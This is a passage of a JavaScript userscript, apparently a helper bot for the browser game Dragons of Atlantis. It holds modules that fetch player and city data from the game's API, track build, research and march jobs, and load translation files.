 The Seed object contains a wealth of information including alliance membership, 
number of people in the alliance, facebook ids of each member, the ol's information 
(in alliances and alliance_membership), the s object contains all the buildings for 
the cities, whether or not the city is on defense, the list of generals, 
what and where the dragon is, a list of jobs 
(e.g. research, building, units training and pending training, current marches)
The marches alone say where the units are, whether or not they are retreating or 
attacking, general assigned, etc. 
*/

Seed = {
	cities			: [],	  // cities
	city_idx		: {},     // 'indicies'
	city_time		: {},     // timestamps of last update
	city_init		: [],
	generals		: {},
	jobs			: {},     // by city
	marches			: {},
	player			: {},
	quests			: {
		category		: [], 
		list			: [] 
	},
	requirements	: {
		building		: [],
		research		: [],
		resurrect		: [],
		unit			: []
	},
	stats			: {
		building		: {},
		dragons			: {},
		research		: {},
		resurrect		: {},
		unit			: {}
	},
	wildernesses    : {},   // by id
	// Save the totals for each job queue because because the responses of the requests are not real-time
	total			:{
		generals		:0,
		marches			:0,
		training		:{},
	},
	serverTimeOffset: 0,
	tickTimer		: 0,
	
	init : function ( options ) 
	{
		var t = Seed;
	
		t.fetchPlayer ({
			noCities : true,
			onSuccess: function ( r ) {
				verboseLog('Player data was Successfully requested from the server');
				if ( options.onSuccess ){
					options.onSuccess ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			onFailure: function ( r ) {
				if ( options.onFailure ){
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			caller  : ( options.caller || '' ) + ', Seed.init'
		});
		
		clearInterval ( t.tickTimer ); t.tickTimer=null;
		t.tickTimer = setInterval ( t.jobsTick, 1000 );
	},
	
	/*
		options
		{
			city_id:
			callback:
		}
	*/
	fetchCity : function ( options ) 
	{
		if ( !options.city_id ) return;
		
		var t = Seed;
		
		verboseLog('Attempting fetchCity ' + options.city_id);
		
		var p = {};
		
		var url 	= 'cities/'+ options.city_id +'.json';
		var method	= 'POST';
		
		Data.requests.cities.total++;
		
		new MyAjax.RequestDOA ({
			url		  : url,
			method	  : method,
			params	  : p,
			onSuccess : function( r ) {
				if ( r.errors ) 
				{
					Data.requests.cities.errors++;
					r.errmsg = r.errors;
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				if ( r.timestamp ) {
					t.serverTimeOffset = parseInt( r.timestamp - (new Date().getTime() / 1000) );
				}
					
				try {
					t.updateCity( r.city , options.from_init );
					verboseLog('Updated coords for ' + r.city.name + ' are ' + r.city.x + '/' + r.city.y);
				} catch (e) {
					Data.requests.cities.errors++;
					r.errmsg = e.toString();
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
				}
				
				if ( options.onSuccess ){
					options.onSuccess ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			onFailure : function ( r ) {
				Data.requests.cities.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || 'unknow') + ', Seed.fetchCity'
		});
	},

	/*
		options
		{
			city_id:
			callback:
		}
	*/
	fetchGenerals : function ( options )
	{
		if ( !options.city_id ) return;
		
		var p = {}
		
		var url 	= 'cities/'+ options.city_id +'/generals.json';
		var method	= 'GET';
		
		Data.requests.generals.total++;
		
		new MyAjax.RequestDOA ({
			url		  : url,
			method	  : method,
			params	  : p,
			onSuccess : function( r ) {  

				if ( r.generals ) 
				{
					if ( options.onSuccess ){
						options.onSuccess ( r.generals );
					}
					else if ( options.callback ) {
						options.callback ( r.generals );
					}
				} 
				else {
					Data.requests.generals.errors++;
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
				}
			},
			onFailure : function( r ) {
				Data.requests.generals.errors++;
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', Seed.fetchGenerals'
		});
	},
	
	/*
		options
		{
			noPlayer:
			noCities:
			cities:
			callback:
		}
	*/
	fetchPlayer : function ( options ) 
	{
		var t = Seed;
		var city;
		
		if (!options) options = {};
		
		if ( options.noPlayer )
		{
			// options.cities (array)
			// only fetch the cities id in the array
			if ( options.cities && options.cities.length ) 
			{
				var last_city = options.cities.length-1;
				for ( var i = 0; i <= last_city;  i++ )
				{
					// First, check if exist the city_id (by Lord Mimir)
					if ( t.city_idx[options.cities[i]] !== undefined ) {
						t.fetchCity({
							city_id   : options.cities[i],
							onSuccess : ( i === last_city ) ? options.onSuccess : function(){},
							onFailure : ( i === last_city ) ? options.onFailure : function(){},
							callback  : ( i === last_city ) ? options.callback : function(){},
							delay     : Math.randRange(i*1000, i*3000),
							timeout   : 1000,
							caller    : (options.caller || '.unknow') + ', Seed.fetchCity'
						});
					
					}
				}
				return;
			}
		}
		
		var p = {};
		
		var url 	= 'player.json';
		var method	= 'GET';
		
		Data.requests.player.total++;
		
		new MyAjax.RequestDOA ({
			url	      : url,
			method	  : method,
			params	  : p,
			onSuccess : function( r ) {
				if ( r.errors ) 
				{
					Data.requests.player.errors++;
					r.errmsg = r.errors;
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				if ( r.timestamp ) {
					t.serverTimeOffset = parseInt( r.timestamp - (new Date().getTime() / 1000) );
				}
					
				// Set Seed.player
				t.player = r;
				
				// set Seed.wildernesses
				for ( var i = 0; i < r.player_wildernesses; i++) 
				{
					var wild = r.player_wildernesses[i];
					t.wildernesses[ wild.id ] = {
						level : wild.level,
						type  : wild.type,
						x     : wild.x,
						y     : wild.y,
					};
				}
					
  				// options.cities (array)
				// only fetch the cities id in the array
				if ( options.cities && options.cities.length ) 
				{
					var last_city = options.cities.length-1;
					for ( var i = 0; i <= last_city;  i++ )
					{
						// First, check if exist the city_id (by Lord Mimir)
						if ( t.city_idx[options.cities[i]] !== undefined ) {
							t.fetchCity({
								city_id   : options.cities[i],
								onSuccess : ( i === last_city ) ? options.onSuccess : function(){},
								onFailure : ( i === last_city ) ? options.onFailure : function(){},
								callback  : ( i === last_city ) ? options.callback : function(){},
								delay     : Math.randRange(i*1000, i*3000),
								timeout   : 1000,
								caller    : (options.caller || '.unknow') + ', Seed.fetchCity'
							});
							
						}
					}
					return;
				}
				
				// Fill the city_init array 
				// (used here & in the StartUp process so it must be before to verified options.noCities)
				var i = 0;
				for ( city in r.cities ) 
				{
					if ( t.city_init[i] === undefined ) {
						t.city_init[i] = {};
					}
					t.city_init[i].id = r.cities[city].id;
					t.city_init[i].name = r.cities[city].name;
					t.city_init[i].type = city;
					i++;
				}
				
				// option.noCities (boolean)
				// Don't fetch Cities if we are from StartUp, because we do from there
				if ( options.noCities ) 
				{
					if ( options.onSuccess ) {
						options.onSuccess ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
					return;
				}
				
				
				// OK, fetch all cities

				try {
					var last_city = t.city_init.length - 1;
					for ( var i=0; i <= last_city; i++ )
					{
						if ( t.city_init[i].timer ){
							clearTimeout ( t.city_init[i].timer ); t.city_init[i].timer=null;
						}
						
						t.fetchCity({
							city_id   : t.city_init[i].id,
							onSuccess : ( i === last_city ) ? options.onSuccess : function(){},
							onFailure : ( i === last_city ) ? options.onFailure : function(){},
							callback  : ( i === last_city ) ? options.callback : function(){},
							delay     : Math.randRange(i*1000, i*3000),
							timeout   : 1000,
							caller    : (options.caller || '.unknow') + ', Seed.fetchCity'
						});
						
					}
				} catch (e) {
					Data.requests.player.errors++;
					r.errmsg = e.toString();
					if ( options.onFailure ) {
						options.onFailure ( r );
					}
					else if ( options.callback ) {
						options.callback ( r );
					}
				}
				/*
				if ( options.onSuccess ){
					options.onSuccess ( r );
				}
				*/
			},
			
			onFailure  : function ( r ) {
				if ( options.onFailure ) {
					options.onFailure ( r );
				}
				else if ( options.callback ) {
					options.callback ( r );
				}
			},
			
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || '.unknow') + ', Seed.fetchPlayer'
		});
	},
	
	/* Jobs Tick
	* Called once per second - to check for job completion (Fixed by Lord Mimir)
	*/
	jobsTick : function () 
	{ 
		var t = Seed;
		var j = Tabs.Jobs;
		var now = parseInt( serverTime() );
		
		var refresh_cities = [];

		// Check for job completion
		
		/* Cities */
		for ( var city_id in t.jobs )
		{
			/* Jobs */
			for ( var job_id in t.jobs[ city_id ] ) 
			{
				var job = t.jobs[ city_id ][ job_id ];
				
				if ( job.done ) 
				{
					if ( now > job.run_at - 2 )
					{
					
						switch ( job.queue ) {
						case 'building':
							j.building.refreshBuilding = true;
							Buildings.setLevel ( city_id, job.city_building_id, job.level );
							j.building.refreshTab = true;
							
							//Didi modif : to update level of dragon
							if ( /(DragonKeep)/.test(job.city_building_type) ) {
								var dragon_name = Dragons.DRAGONS_NAMES[ city_idx ];
								Dragons.addLevel(dragon_name); 
							}
							break;
						case 'march':
							var march = t.marches[ job.march_id ];
							if ( !march || march.job_id != job.id ) break;
							switch ( march.status ) {
							case 'marching':

								//Messages.marchAtTarget();
								
								break;
								
							case 'retreating':
								var city = t.cities[ t.city_idx[march.city_id] ];
								
								// Update General
								// Check if we have a general in the march, because Transports dont have generals (by Didi)
								if (march.general_id) {
									t.generals[ march.general_id ].victories = march.general.victories;
									t.generals[ march.general_id ].rank = march.general.rank;
									t.generals[ march.general_id ].x = march.x;
									t.generals[ march.general_id ].y = march.y;
									t.generals[ march.general_id ].status = march.status;
									t.generals[ march.general_id ].busy = false;
									t.total.generals += 1;
								}
								
								// Check if transport march
								if ( march.march_type === 'TransportMarch' ) {
									refresh_cities.push(Seed.cities[0].id);
								}
								
								// Update Units and Dragons
								for( var unit_type in march.units )
								{
									if( Dragons.DRAGONS_REGEXP.test( unit_type ) )
									{
										Dragons.returnInCity(unit_type);
									} else {
										Units.add(unit_type,march.units[ unit_type ]);
									}
								}
								
								//Didi : Remove march here
								var march_remove = false;
								for ( var type in Data.marches ) {
									if ( (Data.marches[ type ])[march.id] ) {
										Marches.remove( march.id, type );
										march_remove = true;
									}
								}
								//Didi : march not found with type ==> delete without type
								if (!march_remove) {
									Marches.remove( march.id );
								}
								break;
							}
							break;
						case 'research':
							t.player.research[ job.research_type ] = job.level;
							j.research.current_research [ job.research_type ] = false;
							j.research.refreshTab = true;
							break;
						case 'units':
						case 'resurrection':
							Units.add(job.unit_type,job.quantity);
							t.total.training[ city_id ]--;
							break;
						case 'dragon':
							var city_idx = t.city_idx[ city_id ];
							Dragons.Healing( city_idx );
							break;
						case 'outpost':
							break;
						case 'trade':
							var res = {};
							if ( job.offer & job.offer.product ) {
								res[job.offer.product] = job.offer.units;
							}
							Resources.add(res);
							break;
						default:
							logit('fetch city for job='+inspect(job,8,1));
							refresh_cities.push(city_id);
						}

						// Delete the Job
						delete ( t.jobs[ city_id ][ job_id ] );

						Sound.PlaySound('jobs_'+job.queue);
					}
				}	else {
					if ( now > ( job.run_at ) )	{ 
					
						job.done = true;
						
						if ( job.march_id ) 
						{
							var march = t.marches[ job.march_id ];
							if ( march && march.status === 'marching' )
							{
								refresh_cities.push(city_id);
								//t.fetchCity ({
								//	city_id   : city_id,
								//	callback : function( r ){},
								//	caller    : 'Seed.jobsTick'
								//});
								
								// Update Data Map in case of wilderness
								// Didi : hum, i not sure it's necessary
								if ( /(Anthropus|Bog)/.test(march.terrain_type) == false )
								{
									Map.tileAt ({
										x         : march.x,
										y         : march.y,
										onSuccess : function(){},
										onFailure : function(){},
										caller    : 'Seed.jobsTick'
									});
								}
							}
						}
						
						//Didi modif : to update Resources rates
						if ( job.queue === 'building' && /(Farm|Quarry|Mine|Lumbermill|Home)/.test(job.city_building_type) ) {
							refresh_cities.push(city_id);
							//t.fetchCity ({
							//		city_id   : city_id,
							//		callback : function( r ){},
							//		caller    : 'Seed.jobsTick'
							//	});
						}

						//Didi modif : to update Resources rates
						if ( job.queue === 'research' && /(Agriculture|Woodcraft|Masonry|Mining|Rationing)/.test(job.research_type) ) {
							refresh_cities.push(city_id);
							//t.fetchCity ({
							//		city_id   : city_id,
							//		callback : function( r ){},
							//		caller    : 'Seed.jobsTick'
							//	});
						}

					} else {
						// Didi : update life of dragon
						if ( job.queue === 'dragon' ) {
							var city_idx = t.city_idx[ city_id ];
							Dragons.Wounded(city_idx,job.run_at);
						}
					}
				} 
			}
		}
		refresh_cities.sort();
		last_id=-1;
		for (var i=0;i<refresh_cities.length;i++) {
			if (refresh_cities[i] !== last_id) {
				last_id=refresh_cities[i];
				t.fetchCity ({
					city_id   : last_id,
					callback : function( r ){},
					caller    : 'Seed.jobsTick'
				});
			}
		}
	},
	
	updateCity : function ( city, from_init ) 
	{
		var t = Seed;
		
		if ( !city ) return;
		
		verboseLog('Updating City values: ' + city.name);
		
		var now = serverTime(); 
		
		// Fixed by Lord Mimir (thanks you very much!)
		var city_idx;    
			//console.log(' city.outpost_type='+ city.outpost_type);
		if ( typeof t.city_idx[city.id] !== 'undefined' && t.city_idx[city.id] !== null )
		{
			city_idx = t.city_idx[city.id];
		}
		else if ( city.type === 'Capital' ) 
		{
			city_idx = 0;
		} 
		else {
			city_idx = OUTPOST_TYPE_INDEX[ city.outpost_type ] || t.cities.length;
			
			if ( city_idx === 0 ) city_idx = 1; // I think that can never be zero here (La Larva)

			if ( typeof t.cities[city_idx] !== 'undefined' && t.cities[city_idx] !== null )
			{
				t.city_idx[t.cities[city_idx].id] = t.cities.length;
				t.cities[t.cities.length] = t.cities[city_idx];
			}
		}
		
		t.cities[city_idx] = city;
		//console.log('city.name='+city.name);		
		t.city_idx[city.id] = city_idx;
		
		t.city_time[city.id] = now;  
		
		// Only Capital City
		if ( city_idx === 0 ) 
		{
			// update Resources.last_refresh time
			Resources.onUpdateCity();

			// update Seed.generals
			for ( var i=0; i < city.generals.length; i++ )
			{
				t.generals[ city.generals[i].id ] = city.generals[i];
			}
			t.total.generals = city.generals.length;
			
			// update Seed.marches
			// Didi check if Seed.marches exist always
			for ( var id in Seed.marches )
			{
				var seed_march = Seed.marches[id];
				var march_found = false;
				for ( var i=0; i < city.marches.length && !march_found; i++ )
				{
					var city_march = city.marches[i];
					if ( city_march.id === seed_march.id ) {
						march_found = true;
					}
				}
				if ( !march_found ) {			
					// check if some dragon is in the march units and update his state in Seed.dragons
					for( var unit_type in seed_march.units )
					{
						if( Dragons.DRAGONS_REGEXP.test( unit_type ) )
						{
							Dragons.returnInCity(unit_type);
						}
					}
					//Didi : Remove march here
					var march_remove = false;
					for ( var type in Data.marches ) {
						if ( (Data.marches[ type ])[seed_march.id] ) {
							Marches.remove( seed_march.id, type);
							march_remove = true;
						}
					}
					//Didi : march not found with type ==> delete without type
					if (!march_remove) {
						Marches.remove( seed_march.id );
					}
				}
			}
			
			t.total.marches = 0;
			for ( var i=0; i < city.marches.length; i++ )
			{
				var march = city.marches[i];
				t.total.marches++;
				
				if (t.marches[march.id]) {
					t.marches[ march.id ].mergeWith(march); 
				} else {
					t.marches[ march.id ] = march.cloneProps();
				}
				
				if ( march.general_id ){
					// Do not know why, but some generals are not defined at times ( La Larva )
					if ( !t.generals[ march.general_id ] ) {
						t.generals[ march.general_id ] = {};
						console.log('ERROR in updateCity() : could not be found General Id: ' + march.general_id + ' in Seed.generals. Creating an entry to fix the problem.');
					}
					
					t.generals[ march.general_id ].busy = true;
					t.generals[ march.general_id ].x = march.x;
					t.generals[ march.general_id ].y = march.y;
					t.generals[ march.general_id ].status = march.status;
				}
				
				// check if some dragon is in the march units and update his state in Seed.dragons
				for( var unit_type in march.units )
				{
					if( Dragons.DRAGONS_REGEXP.test( unit_type ) )
					{
						Dragons.InMarch(unit_type,march);
					}
				}
				
				t.marches[march.id].target_type = march.destination_name  ?  'City' : march.terrain_type;
			}
		}

		// Check and Add Jobs
		if ( !t.jobs[ city.id ] ) {
			t.jobs[ city.id ] = {};
		}
		
		t.total.training[ city.id ] = 0;

		for ( var i=0; i < city.jobs.length; i++ )
		{
			var job = city.jobs[i];
			t.checkAddJob ( job );
			switch (job.queue )
			{
			case 'units':
			case 'resurrection':
				t.total.training[ city.id ]++;
				break;
			}
		}
		
		// add Dragons object (by Didi)
		// Check each city - Wham & Larvitus
		for (var i=0; i < t.cities.length; i++)
		{
			// skip undefined cities
			if ( !t.cities[ i ] ) continue;
		
			var dragon_name = Dragons.DRAGONS_NAMES[ i ];    // city_idx
			
			Dragons.updateDragon(dragon_name,t.cities[ i ]);
		}	

		// Calculate speed_multiplier for the trainings
		// based on training camps of all cities and
		// stores the value in capital city figures object
		var speed_multiplier = 0;

		for (var i = 0; i < t.cities.length; i++)
		{
			if ( !t.cities[ i ] ) continue;

			var build_type;
			switch ( i ) 
			{
			case 0 : build_type = 'Garrison'; break;
			case OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] : build_type = 'DarkPortal'; break;
			default : build_type = 'TrainingCamp'; break;
			}
      var building_count = 0;
      var levels_count = 0;
			var rookery_boost = 0;
			
			for (var j = 0; j < t.cities[ i ].buildings.length; j++)
			{
				if ( t.cities[ i ].buildings[ j ].type === build_type )
				{
					building_count++;
					levels_count += t.cities[ i ].buildings[ j ].level;
				}
				else if ( t.cities[ i ].buildings[ j ].type === "Rookery" )
				{
					rookery_boost = t.cities[ i ].buildings[ j ].level;
				}
			}
			if ( building_count == 0 ) {
				speed_multiplier = 0;
			} else {
				speed_multiplier = (building_count + ((levels_count-building_count)/10));
			}
			if ( !t.cities[ i ].figures.unit ) {
				t.cities[ i ].figures.unit = {};
			}
			if ( i === OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] ) {
				speed_multiplier *= 100/15;
			}
			t.cities[ i ].figures.unit.speed_multiplier = speed_multiplier;
			t.cities[ i ].figures.unit.rookery_multiplier = rookery_boost;
		}

		if ( from_init ) {
			for ( var i=0; i < t.city_init.length; i++ ){
				if ( t.city_init[i].id === city.id && !t.city_init[i].loaded) {
					t.city_init[i].loaded = true;
					var message = 'City ' + city.id + ' Successfully initialised';
					verboseLog(message);
				}
			}
		} else {
			verboseLog('City ' + city.id + ' Successfully updated');
		}
	},
	
	checkAddJob : function ( job )
	{
		var t = Seed;
		var tj = Tabs.Jobs;
		var city_id = job.city_id;
		
		if ( !job.run_at )
		{
			debugLog ('checkAddJob job.run_at is null:\n'+ inspect (job, 5, 1));
			return;
		}    
		
		if ( job.queue === 'march' )
		{
			if ( t.marches[job.march_id] ) 
			{
				t.marches[job.march_id].run_at   = job.run_at;
				t.marches[job.march_id].duration = job.duration;
				t.marches[job.march_id].job_id   = job.id;
				
				var march = t.marches[job.march_id];
				// Check if we have a general in the march, because Transports dont have generals (by Didi)
				if (march.general_id) {
					t.generals[ march.general_id ].busy = true;
					t.generals[ march.general_id ].x = march.x;
					t.generals[ march.general_id ].y = march.y;
					t.generals[ march.general_id ].status = march.status;
				}
				// Check for dragon status
				for( var unit_type in march.units )
				{
					if( Dragons.DRAGONS_REGEXP.test( unit_type ) )
					{
						Dragons.InMarch(unit_type,march);
					}
				}
			}
		} 

		//Didi : add dragon job !		
		if ( job.queue === 'dragon' )
		{
			var city_idx = t.city_idx[job.city_id];
			if ( city_idx ) 
			{
				Dragons.Wounded(city_idx,job.run_at);
			}
		}
		
		//Didi : check research in current
		if ( job.queue === 'research' )
		{
			tj.research.current_research [ job.research_type ] = true;
		}
		
		t.jobs[ city_id ][ job.id ] = job; //.cloneProps ();
	},
	
}; // END Seed




Translation = {
	loaded : false,
	
	data	: {},

	available_langs : {
		 da : true 
		,de : true
		,en : true
		,es : true
		,fr : true 
		,gr : false
		,id : false
		,it : true
		,nl : true
		,pl : true
		,pt : false
		,ru : false
		,sv : true
		,tr : true
	},
	
	/* WARNING: DON'T CHANGE THIS ORDER */
	_section : [
		 'items'
		,'common'
		,'buildings'
		,'messages'
		,'dialogs'
		,'troops'
		,'map'
		,'alliances'
		,'research'
		,'quests'
		,'levels'
		,'confirmations'
		,'outposts'
	],

	// used by the translate function to check for missing translations
	missing:{}, 
	
	init : function ( options ) 
	{
		var t = Translation;
		t.fetchLocale({
			onSuccess : function ( r ) {
				verboseLog('Locale data was Successfully requested from the sever');

				t.loaded = true;
				t.fixResults();

				if ( options.onSuccess ) {
					options.onSuccess ( r );
				}
				//This is only for programming purposes
				/*
				var str = '"var_name";"translation"<br>';
				for (var i=0; i < Translation._section.length; i++){
					for (var_name in Translation.data[Translation._section[i]]){
						str +=  '"' + var_name + '";"' +Translation[Translation._section[i]]( var_name ) + '"<br>' ;
					}
				}
				debugLog ( str );
				*/
				
			},
			onFailure : function ( r ) {
				if ( options.onFailure ){
					options.onFailure ( r );
				}
			},
			caller : (options.caller || '.unknow') + ', Translation.init'
		});
	},

	fetchLocale : function ( options ) 
	{
		var t = Translation;
		
		var p = {};
		p['_swf_session_id'] = SESSION_ID;
		
		new MyAjax.RequestDOA ({
			url		: 'locales/' + ( t.available_langs[LANG_CODE] ? LANG_CODE : 'en') + '.xml',
			method	: 'GET',
			params	: p,
			nonapi  : true,
			
			onSuccess : function ( r ) {
				try {
					t.parseXML( r );
					
				} catch (e) {
					if ( options.onFailure ) {
						r.errmsg = e.toString();
						options.onFailure ( r );
					}
					return;
				}
			if ( options.onSuccess ) {
					options.onSuccess ( r );
				}
			},
			onFailure : function ( r ) {
				if ( r.errmsg.indexOf('404') !== -1 ) {
					var p = {};
					p['_swf_session_id'] = SESSION_ID;
					new MyAjax.RequestDOA ({
						url		: 'locales/en.xml',
						method	: 'GET',
						params	: p,
						onSuccess : function( r ) {
							try {
								t.parseXML(r);
							} catch (e) {
								if ( options.onFailure ) {
									r.errmsg = e.toString();
									options.onFailure ( r );
								}
							}
						},
						onFailure : function( r ) {
							if ( options.onFailure ) {
								options.onFailure ( r );
							}
						},
						caller  : (options.caller || '.unknow') + '.fetchLocale.onFailure'
					});
				}
				else if ( options.onFailure ) {
					options.onFailure ( r );
				}
			},
			caller  : (options.caller || '.unknow') + '.fetchLocale'
		});
	},
	
	parseXML : function( xml_string )
	{
		var t = Translation;
		var now = parseInt( serverTime() );
		
		//console.log(xml_string);
		// Didi : replace balise starting with 
		xml_string = xml_string.replace(/<[0-9]+/g,'<'); 
		xml_string = xml_string.replace(/<\/[0-9]+/g,'<\/');
		
		// Didi : complete empty balise
		xml_string = xml_string.replace(/<>/g,'<Teamwork_'+now+'>'); 		
		xml_string = xml_string.replace(/<\/>/g,'<\/Teamwork_'+now+'>'); 		
		
		// Didi : replace illegal starting char
		xml_string = xml_string.replace(/<[\-\;\,\.\<\>]/g,'<Teamwork-'); 		
		xml_string = xml_string.replace(/<\/[\-\;\,\.\<\>]/g,'<\/Teamwork-'); 		

		var xml_tmp_obj = new XML.ObjTree();

		var data = xml_tmp_obj.parseXML(xml_string);
		if (data.translations) {
			if (data.translations.parsererror)		{
				console.log('erreur parsing : '+inspect(data.translations.parsererror,8,1));
				console.log(xml_string);
			}
				for (sect in data.translations)
				{
					var sect_ok = false;
					for (i = 0; i < t._section.length && !sect_ok; i++ )
					{
						if (sect === t._section[i]) sect_ok=true;
					}
					if (!sect_ok) {
						delete data.translations[sect];
					} else {
					}
				}
				t.data = data.translations;
				//console.log(inspect(t.data,8,1));
		} else {
			verboseLog('<b>ERROR</b> in the XML file structure: <b><translations></b> element not found!');
		}
	},
	
	fixResults : function()
	{
		var t = Translation.data;
		
		// Convert Objects in flat Object
		// ex: 
		//     root-key : { title: '', content-1: { name: '', desc: ''} }
		//
		// become
		//
		//     root-key-title: '' & root-key-content-1-name : '' & root-key-content-1-desc : ''
		// 
		function objectToFlat ( obj )
		{
			var r = {};
			for ( var key in obj )
			{
				if ( typeof obj[key] === 'object' )
				{
					for ( var subkey in obj[key] )
					{
						if ( typeof ( obj[key] )[subkey] === 'object' )
						{
							for ( var subsubkey in ( obj[key] )[subkey] )
							{
								if ( subsubkey === 'title' || subsubkey === 'name' )
								{
									r[key+'-'+subkey] = ( ( obj[key] )[subkey] )[subsubkey];
								} 
								else {
									r[key+'-'+subkey+'-'+subsubkey] = ( ( obj[key] )[subkey] )[subsubkey];
								}
							}
						} 
						else {
							if ( subkey === 'title' || subkey === 'name' )
							{
								r[key] = ( obj[key] )[subkey];
							} 
							else {
								r[key+'-'+subkey] = ( obj[key] )[subkey];
							}
						}
					}
				} else {
					r[key] = obj[key];
				}
			}
			return r;
		}
		
		var section = ['confirmations','quests','dialogs','messages','alliances']; 
		
		for ( var i=0; i < section.length; i++ )
		{
			t[section[i]] = objectToFlat( t[section[i]] );
		}
			
		t.common.information = t.common.info;
		t.common.omit = t.common.skip;
		t.common['spy-on'] = t.common.spy;
		t.dialogs.researching = t.dialogs.research;
		
		t.common['enter-coords'] = t.dialogs['attack-screen-enter-coords'];
		t.common['your-player'] = t.dialogs['change-realm-your-player'];
		t.common['battle-report'] = t.messages['battle-report-title'];
		t.common['auto-collection-of-resources'] = t.dialogs['boost-collect-day'].replace(/:/,'');
		
		t.common.levels = findSimilarWord( t.common.level, t.messages['spy-tip-prefix'] );
		
		delete t.common.error;
		delete t.common.home;
		delete t.common.info;
		delete t.common['ranged-attack'];
		delete t.common.skip;
		delete t.common.spy;
		delete t.messages.date;
		delete t.messages.fought;
		delete t.messages.subject;
		delete t.messages.to;
		delete t.dialogs.research;
		delete t.dialogs.spy;
		delete t.dialogs.unavailable;
		delete t.dialogs.upkeep;
	},
	
	_normalize : function ( str )
	{
		return ( str||'' ).toLowerCase().replace(/ /g,'-');
	},
	
	getContent : function( section, key, subkey )
	{
		var t = Translation;
		key = t._normalize(key);
		if ( t.data[section] !== undefined ) 
		{
			if ( ( t.data[section] )[key] !== undefined ) 
			{
				return subkey ? ( ( t.data[section] )[key] )[subkey] : ( t.data[section] )[key];
			}
		}
		return false;
	},
	
	buildings : function( key, subkey )
	{
		subkey = subkey !== undefined ? subkey : 'name';
		return Translation.getContent( 'buildings', key, subkey );
	},
	
	common : function( key )
	{
		return Translation.getContent( 'common', key );
	},
	
	items : function( key, subkey )
	{
		subkey = subkey !== undefined ? subkey : 'name';
		return Translation.getContent( 'items', key, subkey );
	},
	
	dialogs : function( key )
	{
		return Translation.getContent( 'dialogs', key );
	},
	
	levels : function( key )
	{
		return Translation.getContent( 'levels', key, 'title' );
	},
	
	map : function( key, subkey )
	{
		subkey = subkey !== undefined ? subkey : 'name';
		return Translation.getContent( 'map', key, subkey );
	},
	
	outposts : function( key, subkey )
	{
		subkey = subkey !== undefined ? subkey : 'name';
		return Translation.getContent( 'outposts', key, subkey );
	},

	messages : function( key )
	{
		return Translation.getContent( 'messages', key );
	},
	
	troops :  function( key, subkey )
	{
		subkey = subkey !== undefined ? subkey : 'name';
		return Translation.getContent( 'troops', key, subkey );
	},
	
	research :  function( key, subkey )
	{
		subkey = subkey !== undefined ? subkey : 'name';
		return Translation.getContent( 'research', key, subkey );
	},
	
	quests :  function( key, subkey ){
		//subkey = subkey != undefined ? subkey : 'title';
		return Translation.getContent( 'quests', key, subkey );
	},
	
	confirmations :  function( key, subkey ){
		//subkey = subkey != undefined ? subkey : 'title';
		return Translation.getContent( 'confirmations', key, subkey );
	},
	
	alliances :  function( key, subkey ){
		//subkey = subkey != undefined ? subkey : 'title';
		return Translation.getContent( 'alliances', key, subkey );
	},
	
	errors : function( key, subkey )
	{
		//subkey = subkey !== undefined ? subkey : 'name';
		return Translation.getContent( 'activerecord', key, subkey );
	},
	
}; // END Translation

// Provide language translation services
translate = function( text ) 
{
	//if (text===undefined) return;
	
	if ( LANG_OBJECT[text] !== undefined ) {
		return LANG_OBJECT[text];
	}
	else if ( Translation.loaded ){
		var new_text;
		for ( var i = 0; i < Translation._section.length; i++ )
		{
			new_text = Translation[Translation._section[i]]( text );
			if ( new_text ){
				if ( typeof ( new_text ) === 'object' ) {
					console.log('object in section '+Translation._section[i]+ ' : ' + inspect(new_text,8,1));
					console.log('section '+Translation._section[i] + ' = '+inspect(Translation[Translation._section[i]],8,1));
				}
				return new_text;
			}
		}
		
		if ( IS_NOT_NATIVE_LANG && Translation.missing[text] === undefined ) {
			Translation.missing[text] = 1;
			if ( Tabs.Logs ) {
				debugLog( '( Translate ) -> ' + text );
			}
		}
	}
	
	return text;
};

//****************
// Functions
//****************

//Didi modif
function miles( num ) {
  var n = '';
  var m = String( num );
  var sign = '';
  if ( m.substr( 0, 1 ) === '-' || m.substr(0,1) === '+' ) {
  	sign = m.substr( 0, 1 );
  	m = m.substr( 1 );
  }
  while ( m.length > 3 ) {
    n = ',' + m.substr( m.length - 3 ) + n;
    m = m.substr( 0, m.length - 3 );
  }
  return sign + m + n;
}

function objAddTo ( o, name, val )
{
	if ( !o[name] )
	{
		o[name] = val;
	} 
	else {
		o[name] += val;
	}
}

function getGeneralsList ( city_idx )
{
	var ret = {};
	var generals = Seed.cities[city_idx].generals;
	for (var i=0; i < generals.length; i++)
	{
		ret[generals[i].id] = generals[i].name +' ('+ generals[i].rank +')';
	}
	return ret;
}

function getAvailableGeneral ( by_rank )
{
	var keys = getKeys (Seed.generals);
	
	// We chose the option "by_rank" to sort the generals by rank of lower to higher 
	// for cases where the objective is level 1 and we need to find a general with 
	// less than 5 ranks.. if not.. we make a random sort of the generals list to
	// take a random general.
	if ( by_rank ) {
		keys.sort( function(a,b){return Seed.generals[a].rank - Seed.generals[b].rank;} );
	} else {
		// Remove generals with ranks lower that 5 stars from the list
		for ( var i=0; i < keys.length; i++ )
		{
			if ( Seed.generals[ keys[i] ].rank < 5 ) {
				keys.splice( i , 1 );
			}
		}
